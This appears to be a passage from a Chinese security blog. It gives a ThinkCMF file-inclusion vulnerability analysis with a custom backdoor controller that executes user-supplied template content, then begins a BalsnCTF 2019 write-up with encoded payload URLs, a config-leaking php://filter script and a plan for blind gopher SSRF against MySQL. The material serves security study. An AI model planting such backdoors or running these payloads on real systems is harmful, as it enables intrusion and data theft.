<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// 使用PHP原生模板</span></span><br><span class="line">        $_content   =   $content;</span><br><span class="line">        <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">        <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">        <span class="keyword">empty</span>($_content)?<span class="keyword">include</span> $templateFile:<span class="keyword">eval</span>(<span class="string">'?&gt;'</span>.$_content);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 视图解析标签</span></span><br><span class="line">        $params = <span class="keyword">array</span>(<span class="string">'var'</span>=&gt;<span class="keyword">$this</span>-&gt;tVar,<span class="string">'file'</span>=&gt;$templateFile,<span class="string">'content'</span>=&gt;$content,<span class="string">'prefix'</span>=&gt;$prefix);</span><br><span class="line">        Hook::listen(<span class="string">'view_parse'</span>,$params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取并清空缓存</span></span><br><span class="line">    $content = ob_get_clean();</span><br><span class="line">    <span class="comment">// 内容过滤标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_filter'</span>,$content);</span><br><span class="line">    <span class="comment">// 输出模板文件</span></span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进Hook.class.php中exec</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">($tag, &amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">self</span>::$tags[$tag])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(APP_DEBUG) &#123;</span><br><span class="line">            G($tag.<span class="string">'Start'</span>);</span><br><span class="line">            trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --START--'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">self</span>::$tags[$tag] <span class="keyword">as</span> $name) &#123;</span><br><span class="line">            APP_DEBUG &amp;&amp; G($name.<span class="string">'_start'</span>);</span><br><span class="line">            $result =   <span class="keyword">self</span>::exec($name, $tag,$params);</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG)&#123;</span><br><span class="line">                G($name.<span class="string">'_end'</span>);</span><br><span class="line">                trace(<span class="string">'Run '</span>.$name.<span class="string">' [ RunTime:'</span>.G($name.<span class="string">'_start'</span>,$name.<span class="string">'_end'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">....</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Exec如下</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($name, $tag,&amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'Behavior'</span> == substr($name,<span class="number">-8</span>) )&#123;</span><br><span class="line">        <span class="comment">// 行为扩展必须用run入口方法</span></span><br><span class="line">        $class = $name;</span><br><span class="line">        $tag    =   <span class="string">'run'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $class   =  <span class="string">"plugins\\&#123;$name&#125;\\&#123;$name&#125;Plugin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(class_exists($class))&#123; <span class="comment">//ThinkCMF NOTE 插件或者行为存在时才执行</span></span><br><span class="line">        $addon   = <span class="keyword">new</span> $class();</span><br><span class="line">        <span class="keyword">return</span> $addon-&gt;$tag($params);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进run方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(&amp;$_data)</span></span>&#123;</span><br><span class="line">    $engine             =   strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>));</span><br><span class="line">    $_content           =   <span class="keyword">empty</span>($_data[<span class="string">'content'</span>])?$_data[<span class="string">'file'</span>]:$_data[<span class="string">'content'</span>];</span><br><span class="line">    $_data[<span class="string">'prefix'</span>]    =   !<span class="keyword">empty</span>($_data[<span class="string">'prefix'</span>])?$_data[<span class="string">'prefix'</span>]:C(<span class="string">'TMPL_CACHE_PREFIX'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'think'</span>==$engine)&#123; <span class="comment">// 采用Think模板引擎</span></span><br><span class="line">        <span class="keyword">if</span>((!<span class="keyword">empty</span>($_data[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache($_data[<span class="string">'content'</span>],$_data[<span class="string">'prefix'</span>])) </span><br><span class="line">            ||  <span class="keyword">$this</span>-&gt;checkCache($_data[<span class="string">'file'</span>],$_data[<span class="string">'prefix'</span>])) &#123; <span class="comment">// 缓存有效</span></span><br><span class="line">            <span class="comment">//载入模版缓存文件</span></span><br><span class="line">            Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">            <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">            $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在载入模板缓存文件，并进行inlcude文件包含，执行我们的php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure>

<p>load函数如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($_filename,$vars=null)</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(!is_null($vars))&#123;</span><br><span class="line">extract($vars, EXTR_OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $_filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="自定义后门"><a href="#自定义后门" class="headerlink" title="自定义后门"></a>自定义后门</h3><p>这样的自定义后门比较方便的，而且这个直接去拿的是Think\Controller，并没有去HomebaseController.class.php拿display，如果直接去HomebaseController类去拿display会并且不加任何处理直接传入content内容是会由于主题不存在而直接报错的，不过我们给templateFile赋个值就好了，比如Readme.md或者index.php之类的，我上面也有写。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Portal</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoorController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">parent</span>::display(<span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>,$content, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KsW66x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/KsW66x.md.png" alt="KsW66x.md.png"></a></p>
<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>将HomebaseController中fetch和display两个函数属性设置为protected，使其不可随意通过a参数调用。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/6626" target="_blank" rel="noopener">https://xz.aliyun.com/t/6626</a></p>
<p><a href="https://www.anquanke.com/post/id/189712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189712</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" data-id="ckabsu38n0027kkvrgvvag1ff" class="article-share-link" data-share="baidu" data-title="ThinkCMF任意内容包含漏洞复现分析">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BalsnCTF2019-巅峰极客复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2019-10-27T08:43:18.000Z" itemprop="datePublished">2019-10-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/">BalsnCTF2019+巅峰极客复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个比赛是在国庆那几天举行的..那几天发烧了orz..不过后来听师傅们说题目挺好的，所以来复现一下。</p>
<p>巅峰极客的话是因为当时没做出来，所以来复现一下。</p>
<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>感觉是一道很有趣的题了，不过开始整理代码格式….和那一堆颜文字看的真是头疼…</p>
<p>我直接看的tr1ple师傅整理好的代码233,代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Σ&gt;―(#°ω°#)♡→'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>($secret);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    @curl_setopt(</span><br><span class="line">        $ch,</span><br><span class="line">        CURLOPT_URL,</span><br><span class="line">        str_repLace(</span><br><span class="line">            <span class="string">"int"</span>,</span><br><span class="line">            <span class="string">":DD"</span>,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"%69%6e%74"</span>, <span class="comment">//int</span></span><br><span class="line">                <span class="string">"XDDD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%2e%2e"</span>, <span class="comment">//..</span></span><br><span class="line">                    <span class="string">"Q___Q"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">".."</span>,</span><br><span class="line">                        <span class="string">"QAQ"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">"%33%33%61"</span>, <span class="comment">//33a</span></span><br><span class="line">                            <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%63%3a"</span>, <span class="comment">//c:</span></span><br><span class="line">                                <span class="string">"WTF"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"633a"</span>, </span><br><span class="line">                                    <span class="string">":)"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"433a"</span>,</span><br><span class="line">                                        <span class="string">":("</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"\x63:"</span>,</span><br><span class="line">                                            <span class="string">"ggininder"</span>,</span><br><span class="line">                                            strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">    @curl_EXEC($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">''</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从题目来看，有三条路</p>
<p><strong>首先来看第一个if条件，限制条件如下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">    || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">    || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>经历过限制后，再经过一堆replace后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl strtolower(eval(&quot;return $_;&quot;))</span><br></pre></td></tr></table></figure>

<p>最终不显示curl的结果，也就是无回显的curl</p>
<p><strong>接下来看else if</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">   $_ = @$_GET[<span class="string">''</span>];  <span class="comment"># \u2063</span></span><br><span class="line">   <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">   <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">       || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">       <span class="keyword">die</span>($secret);</span><br></pre></td></tr></table></figure>

<p>又是经过上面一堆过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后限制了跳转目录，然后通过file_get_contents取出固定长度的文件内容。</p>
<p>这里有两条路可以走，我们先看第一个的if</p>
<p>过滤了<code>{[^</code>，这就说明了我们无法拿到$_GET之类的shell，也不能通过异或拿到shell，但是括号没过滤，我们可以通过取反拿到字符，比如phpinfo()，从phpinfo()中可以看到很关键的一点信息，这是个windows的服务器</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KagH58.png" alt="KagH58.png"></p>
<p>看文件是有这个config.php是被包含进来的，这种config.php一般都会有敏感信息的</p>
<p>如果直接去读readfile(config.php)肯定是不行的，不同的字符超过了十三个，看到国外大佬用短文件名去读文件内容，膜</p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;warmup.balsnctf.com&#x2F;?%CE%A3%3E%E2%80%95(%23%C2%B0%CF%89%C2%B0%23)%E2%99%A1%E2%86%92&#x3D;%28%7E%8D%9A%9E%9B%99%96%93%9A%29%28%7E%9C%90%C3%C3%29&amp;op&#x3D;-9</span><br></pre></td></tr></table></figure>

<p>拿到文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    set_time_limit(<span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">'mysql.connect_timeout'</span>,<span class="string">'1'</span>);</span><br><span class="line">    ini_set(<span class="string">'max_execution_time'</span>, <span class="string">'1'</span>);</span><br></pre></td></tr></table></figure>

<p>这里给了一些Mysql的配置信息，并且告诉了flag的位置，那就是gopher配合curl盲打mysql了。</p>
<p><strong>在gopher之前，我们还得说一下第二条路的解法</strong></p>
<p>主要过滤为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">    || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br></pre></td></tr></table></figure>

<p>由于这是windows服务器，虽然他过滤了一个php.，但是我们还有一个php+空格，这里长度的问题，可以通过压缩解决</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line"></span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>; <span class="comment">//code后面的数据即为压缩数据</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>对一个漏洞的利用还是有很多种的，比如这里利用windows对1.php.和1.php空格的处理，在访问或者上传的时候，都会将后面的符号删除进行处理</strong></p>
<p><strong>最后接着来说gopher盲打mysql</strong></p>
<p>这是一个没有回显的ssrf,直接放进去gopher的payload肯定放不进去，所以这里可以再回到之前的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getenv(&quot;HTTP_T&quot;)</span><br></pre></td></tr></table></figure>

<p>不过这里我们看到在config.php种限定了执行时间，所以没法盲注，不过可以通过dns外带拿到数据</p>
